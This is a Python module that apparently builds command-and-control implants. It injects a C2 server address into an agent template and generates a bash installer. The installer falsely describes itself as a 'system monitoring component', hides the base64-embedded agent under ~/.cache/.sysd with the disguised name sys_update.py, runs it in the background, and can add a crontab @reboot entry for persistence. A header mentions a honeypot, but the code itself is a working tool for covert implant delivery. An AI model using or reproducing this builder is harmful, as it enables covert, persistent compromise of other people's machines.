"""
C2 Agent Builder.

Builds customized implant scripts with embedded C2 server config.
Reads the c2_agent.py template and injects configuration.
"""

import json
import secrets
from dataclasses import dataclass
from pathlib import Path


@dataclass(slots=True)
class AgentBuildSpec:
    agent_id: str
    content: bytes
    config: dict
    filename: str
    mime_type: str


_AGENT_TEMPLATE = Path(__file__).resolve().parents[1] / "static" / "c2_agent.py"


def build_agent(
    c2_server: str,
    poll_interval: int = 5,
    agent_id: str = "",
    registration_token: str = "",
) -> AgentBuildSpec:
    aid = agent_id or secrets.token_hex(12)
    config = {
        "c2_server": c2_server.rstrip("/"),
        "agent_id": aid,
        "poll_interval": poll_interval,
        "max_poll_interval": 300,
        "jitter": 0.2,
        "registration_token": registration_token or "",
    }
    template = _AGENT_TEMPLATE.read_text()
    config_block = f"_CONFIG = {json.dumps(config, indent=2)}\n"
    result = []
    in_config = False
    for line in template.split("\n"):
        if line.strip().startswith("_CONFIG = {"):
            in_config = True
            result.append(config_block)
            continue
        if in_config:
            if line.strip() == "}":
                in_config = False
            continue
        result.append(line)
    content = "\n".join(result)

    return AgentBuildSpec(
        agent_id=aid,
        content=content.encode("utf-8"),
        config=config,
        filename="sys_update.py",
        mime_type="application/octet-stream",
    )


def build_agent_wrapper_script(
    c2_server: str,
    poll_interval: int = 5,
    agent_id: str = "",
    persistence: bool = False,
    registration_token: str = "",
) -> AgentBuildSpec:
    aid = agent_id or secrets.token_hex(12)
    config_json = json.dumps(
        {
            "c2_server": c2_server.rstrip("/"),
            "agent_id": aid,
            "poll_interval": poll_interval,
            "max_poll_interval": 300,
            "jitter": 0.2,
            "registration_token": registration_token or "",
        }
    )

    agent_code = _AGENT_TEMPLATE.read_text()
    config_replace = f"_CONFIG = {config_json}\n"
    in_config = False
    result_lines = []
    for line in agent_code.split("\n"):
        if line.strip().startswith("_CONFIG = {"):
            in_config = True
            result_lines.append(config_replace)
            continue
        if in_config:
            if line.strip() == "}":
                in_config = False
            continue
        result_lines.append(line)
    agent_code = "\n".join(result_lines)

    encoded = agent_code.encode("utf-8")

    script = f"""#!/bin/bash
# Agent-Capture-Honeypot C2 Implant Installer
# This script installs a system monitoring component.
set -e
AGENT_DIR="$HOME/.cache/.sysd"
mkdir -p "$AGENT_DIR"
AGENT_FILE="$AGENT_DIR/sys_update.py"
CONF_FILE="$AGENT_DIR/sys_update.conf"

cat > "$CONF_FILE" << 'CONFEOF'
{config_json}
CONFEOF

python3 -c "
import base64, sys
data = base64.b64decode('{_encode_b64(encoded)}')
with open('$AGENT_FILE', 'wb') as f:
    f.write(data)
"

python3 "$AGENT_FILE" &
"""

    if persistence:
        script += """
AGENT_PID=$!
CRON_LINE="@reboot python3 $AGENT_FILE > /dev/null 2>&1 &"
(crontab -l 2>/dev/null | grep -v 'sys_update.py'; echo "$CRON_LINE") | crontab -
echo "Persistence installed (PID: $AGENT_PID)"
"""

    return AgentBuildSpec(
        agent_id=aid,
        content=script.encode("utf-8"),
        config=json.loads(config_json),
        filename="system_update.sh",
        mime_type="application/x-sh",
    )


def _encode_b64(data: bytes) -> str:
    import base64

    return base64.b64encode(data).decode("ascii")
